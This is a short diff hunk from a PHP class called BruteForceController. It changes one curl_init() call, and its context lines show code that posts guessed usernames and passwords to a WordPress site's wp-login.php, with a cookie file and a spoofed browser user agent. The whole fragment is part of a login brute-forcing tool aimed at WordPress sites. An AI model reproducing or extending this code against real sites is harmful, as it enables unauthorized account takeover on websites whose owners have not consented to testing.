@@ -252,7 +252,7 @@ class BruteForceController extends Command{
         $cookie="cookie.txt";
 
         $postdata = "log=". $username ."&pwd=". $password ."&wp-submit=Log%20In&redirect_to=". $target ."wp-admin/&testcookie=1";
-        $ch = curl_init();
+        $ch = \curl_init();
         curl_setopt ($ch, CURLOPT_URL, $target . "wp-login.php");
         curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
         curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
